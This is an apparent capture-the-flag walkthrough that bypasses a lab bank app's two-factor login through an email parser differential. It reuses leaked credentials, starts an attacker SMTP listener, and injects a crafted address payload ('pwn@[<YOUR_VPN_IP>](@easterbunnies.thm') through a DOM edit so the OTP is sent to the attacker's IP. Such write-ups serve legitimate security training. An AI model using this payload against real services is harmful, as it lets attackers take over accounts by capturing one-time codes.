# 🏆 Walkthrough: Bypassing HopsecBank 2FA via Parser Differential

**Objective:** Bypass the 2FA system on the HopsecBank application to access the final `BANK_FLAG`.

---

## 🔍 Phase 1: Reconnaissance & Code Analysis
During the initial enumeration, extracting and analyzing the backend source code (`main.py`) revealed critical information regarding the authentication and 2FA mechanisms:

1. **Credentials:** Discovered the user password (`malharerocks`) and the banking PIN (`210701`).
2. **Exposed Flag:** Found `THM{eggsposed_source_code}` hidden directly in the code comments.
3. **Anti-Brute-Force Trap:** The code explicitly deletes the OTP from the session upon a failed guess (`del session['bank_2fa_code']`), making brute-forcing tools like `ffuf` or Burp Intruder completely ineffective.
4. **The Vulnerability:** The 2FA sending function validates the email address using a simple Python `.endswith('@easterbunnies.thm')` check.

---

## 🧠 Phase 2: The Attack Strategy
Because the Python backend simply splits the string to check the end, but the internal SMTP router (MailHog/Postfix) parses emails according to standard RFC 5322 rules, we can exploit a **Parser Differential**. 



By crafting a highly specific payload, we can trick the Python backend into validating the domain, while simultaneously tricking the mail router into dropping the domain and routing the email directly to our VPN IP address.

---

## 🛠️ Phase 3: Execution

### Step 1: Set Up the "Smart" SMTP Listener
We need a local SMTP server on our attacker machine to catch the inbound OTP email. Using `aiosmtpd` with the `Debugging stdout` handler ensures the email body is printed directly to the terminal, bypassing the need for complex scripts.

On the attacker machine, open a terminal and run:

    sudo aiosmtpd -n -l 0.0.0.0:25 -c aiosmtpd.handlers.Debugging stdout

*(Leave this running. It will listen on Port 25 for the incoming connection from the bank server.)*

### Step 2: Access the Bank App
1. Navigate to the target web application: `https://10.49.180.255:8443/`
2. Log in using the discovered password: `malharerocks`
3. Enter the banking PIN: `210701`
4. You will arrive at the 2FA verification page containing an email dropdown menu.

### Step 3: Inject the Master Payload
We need to manipulate the HTML form to send our custom payload instead of the default dropdown options.

1. Right-click the email dropdown menu on the webpage and select **Inspect (F12)**.
2. Locate the `<option>` tag for the email (e.g., `<option value="carrotbane@easterbunnies.thm">`).
3. Change the `value` attribute to our engineered payload, replacing `<YOUR_VPN_IP>` with your actual `tun0` IP address:

    pwn@[<YOUR_VPN_IP>](@easterbunnies.thm

4. Press **Enter** to save the DOM change.

**Why this payload works:**
* `[<YOUR_VPN_IP>]`: The square brackets force the SMTP router to send the email directly to this IP address rather than performing a DNS lookup.
* `(`: In RFC 5322 email formatting, parentheses denote a comment. The internal SMTP server ignores everything after the opening parenthesis.
* `@easterbunnies.thm`: The Python backend only checks if the raw string ends with this exact text. It doesn't process the comment syntax, so it passes the security check!

### Step 4: Catch the OTP
1. Ensure your injected option is selected in the dropdown menu on the webpage.
2. Click the **"Send OTP"** button.
3. Switch back to your listener terminal. You will instantly see the SMTP handshake and the email body dumped to the screen:

    ---------- MESSAGE FOLLOWS ----------
    Received: from [172.18.0.2] ...
    Subject: Your OTP for HopsecBank
    
    Dear you,
    The OTP to access your banking app is 881010.
    
    Thanks for trusting Hopsec Bank!
    ------------ END MESSAGE ------------

### Step 5: Claim the Flag
1. Copy the **6-digit code** from the terminal output (e.g., `881010`).
2. Paste it into the OTP input box on the bank website.
3. Click **Verify**.
4. The 2FA is successfully bypassed, and the final **BANK_FLAG** is revealed!